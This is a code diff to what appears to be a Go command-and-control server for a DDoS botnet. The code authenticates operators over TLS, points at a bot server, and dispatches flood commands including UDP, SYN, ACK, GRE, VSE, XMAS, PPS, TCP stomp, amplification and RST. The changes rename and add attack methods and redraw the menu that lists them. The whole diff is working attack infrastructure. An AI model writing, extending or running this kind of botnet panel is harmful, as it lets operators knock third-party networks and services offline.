@@ -22,8 +22,8 @@ import (
 
 const (
 	USERS_FILE       = "data/json/users.json"
-	USER_SERVER_IP   = "45.59.124.135"
-	BOT_SERVER_IP    = "45.59.124.135"
+	USER_SERVER_IP   = "192.168.0.11"
+	BOT_SERVER_IP    = "192.168.0.11"
 	BOT_SERVER_PORT  = "7002"
 	USER_SERVER_PORT = "420"
 	CERT_FILE        = "data/certs/server.crt"
@@ -368,9 +368,7 @@ func authUser(conn net.Conn) (bool, *client) {
 		LogAuth(username, clientIP, false)
 
 		remaining := 2 - i
-		conn.Write([]byte("\033[2J\033[H"))
-		conn.Write([]byte("\033[3J\033[H\033[2J"))
-		conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+		drawHeader()
 		conn.Write([]byte(fmt.Sprintf("\033[38;5;196m[!] Invalid credentials. %d attempts remaining.\033[0m\n\n", remaining)))
 
 		if i == 2 {
@@ -495,6 +493,7 @@ func Ping(conn *tls.Conn, stopPing <-chan struct{}) {
 }
 
 func handleRequest(conn *tls.Conn) {
+	defer conn.Close()
 	clientIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()
 
 	if allowed, remaining := CheckConnectionRateLimit(clientIP); !allowed {
@@ -628,7 +627,7 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))
 					time.Sleep(2 * time.Second)
 					gifCommandHandler(parts, conn)
-				case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
+				case "!udp", "!udpsmart", "!tcp", "!syn", "!ack", "!gre", "!vse", "!xmas", "!pps", "!stomp", "!amp", "!rst":
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
@@ -1183,13 +1182,15 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;41m  Method Name    \x1b[38;5;231m║  \x1b[38;5;41m   Description          \x1b[38;5;231m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !udpsmart     \x1b[38;5;231m║ Simple UDP Bypass        ║ ╔══════════════════════════╗ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !udpflood     \x1b[38;5;231m║ Basic UDP Flood          ║ ║        LAYER 4           ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !tcpflood     \x1b[38;5;231m║ Basic TCP Flood          ║ ║     TCP/UDP/SCTP         ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !synflood     \x1b[38;5;231m║ Basic SYN Flood          ║ ║                          ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !ackflood     \x1b[38;5;231m║ Basic ACK Flood          ║ ╠══════════════════════════╣ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !greflood     \x1b[38;5;231m║ Basic GRE Flood          ║ ║        LAYER 7           ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !dns          \x1b[38;5;231m║ DNS Amplification        ║ ║    HTTP/HTTPS/DNS        ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !http         \x1b[38;5;231m║ Simple HTTP Flood        ║ ╚══════════════════════════╝ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !udp          \x1b[38;5;231m║ Basic UDP Flood          ║ ║        LAYER 4           ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !tcp          \x1b[38;5;231m║ Basic TCP Flood          ║ ║     TCP/UDP/SCTP         ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !syn          \x1b[38;5;231m║ Basic SYN Flood          ║ ║                          ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !ack          \x1b[38;5;231m║ Basic ACK Flood          ║ ╠══════════════════════════╣ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !gre          \x1b[38;5;231m║ Basic GRE Flood          ║ ║        LAYER 4+          ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !vse          \x1b[38;5;231m║ Valve Source Engine      ║ ║    SPECIAL METHODS       ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !xmas         \x1b[38;5;231m║ Christmas Tree Flood     ║ ╚══════════════════════════╝ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !pps          \x1b[38;5;231m║ PPS Bypass Flood         ║ ╚══════════════════════════╝ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !stomp        \x1b[38;5;231m║ TCP Stomp Flood          ║ ╚══════════════════════════╝ ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩══════════════════════════╢ ╔══════════════════════════╗ ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mUsage & Information\x1b[38;5;231m §           ║ ║ [1][2][3][4][5][6][7][8] ║ ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╯ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║\n\r"))
